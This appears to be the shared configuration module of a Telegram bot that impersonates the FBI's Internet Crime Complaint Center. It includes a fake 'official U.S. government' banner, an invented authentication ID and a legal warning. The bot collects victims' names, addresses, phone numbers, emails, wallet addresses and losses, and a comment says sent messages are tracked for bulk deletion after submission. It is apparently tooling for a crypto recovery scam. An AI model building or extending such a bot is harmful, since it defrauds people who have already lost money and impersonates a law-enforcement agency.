"""
FBI IC3 – ADRI Bot
Shared configuration, constants, and utility functions.
"""
import os, re, uuid, logging
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

TOKEN     = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]

VALID_PERIOD = "01 JAN 2026 – 31 DEC 2026"
AUTH_ID      = "FBI-2026-HQ-9928-X82"
SUBMIT_COOLDOWN_HOURS = 24

# ── Session state constants ────────────────────────────
(S_FULLNAME, S_ADDRESS, S_PHONE, S_EMAIL,
 S_TXID, S_ASSET, S_VICTIM_WALLET, S_SUSPECT_WALLET, S_AMOUNT,
 S_PLATFORM, S_SCAMMER_ID,
 S_TIME, S_WALLET, S_CONTACT) = range(14)

# ── Runtime state ─────────────────────────────────────
_last_submission = {}
_session_messages = {}

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler("ic3_audit.log", encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

# ── Utility functions ──────────────────────────────────
def is_admin(uid): return (not ADMIN_IDS) or (uid in ADMIN_IDS)
def now_str(): return datetime.now().strftime("%Y-%m-%d %H:%M")

def md(text) -> str:
    """Escape Markdown v2 special characters."""
    return re.sub(r"([_*\[\]()~`>#+\-=|{}.!])", r"\\\1", str(text))

def gen_case_id():
    ts  = datetime.now().strftime("%Y")
    uid = uuid.uuid4().hex[:8].upper()
    sfx = uuid.uuid4().hex[:4].upper()
    return f"IC3-{ts}-AR{uid}-ADRI"

def detect_wallet(addr):
    """Return (chain_name, valid). valid=True when format matches a known chain."""
    if not addr or not isinstance(addr, str):
        return "Unknown", False
    s = addr.strip()
    if re.match(r"^0x[0-9a-fA-F]{40}$", s):
        return "ERC-20/BSC", True
    if re.match(r"^T[A-Za-z0-9]{33}$", s):
        return "TRC-20", True
    if re.match(r"^(1|3|bc1)[A-Za-z0-9]{25,62}$", s):
        return "BTC", True
    return "Unknown", False

def parse_amount(text):
    m = re.match(r"([\d,.]+)\s*([A-Za-z]+)?", text.strip())
    if m:
        amt = m.group(1).replace(",", "")
        coin = (m.group(2) or "").upper()
        return amt, coin
    return None, None

def track_msg(chat_id, msg_id):
    """记录本次会话发送的消息ID，供提交后批量删除。"""
    _session_messages.setdefault(chat_id, []).append(msg_id)

# ── Header block ──────────────────────────────────────
HEADER = (
    "🇺🇸 <b>AN OFFICIAL INTERFACE OF THE U.S. GOVERNMENT</b>\n"
    "────────────────────────────────────\n"
    "🏛️ <b>FEDERAL BUREAU OF INVESTIGATION</b>\n"
    "⚖️ <b>U.S. DEPARTMENT OF JUSTICE</b>\n"
    "🔷 <b>Internet Crime Complaint Center (IC3)</b>\n"
    "📡 <b>Authorized Digital Reporting Interface (ADRI)</b>\n"
    "────────────────────────────────────\n"
    "🛡️ <b>SYSTEM AUTHENTICATION</b>\n"
    f"• Registry ID: <code>{AUTH_ID}</code>\n"
    "• Node Status: ACTIVE / SECURE\n"
    "• Encryption: AES-256 · FIPS 140-3 Compliant\n\n"
    "<b>Official Notice:</b>\n"
    "This automated intake system is authorized for the collection of\n"
    "digital evidence and formal internet crime complaints. All\n"
    "transmissions are monitored and logged for investigative purposes.\n\n"
    "⚖️ <b>LEGAL ATTESTATION</b>\n"
    "Under <b>18 U.S.C. § 1001</b>, knowingly and willfully making any\n"
    "materially false, fictitious, or fraudulent statement or\n"
    "representation in any matter within the jurisdiction of the\n"
    "Government of the United States is a criminal offense.\n\n"
    "Please select an authorized module below to proceed."
)
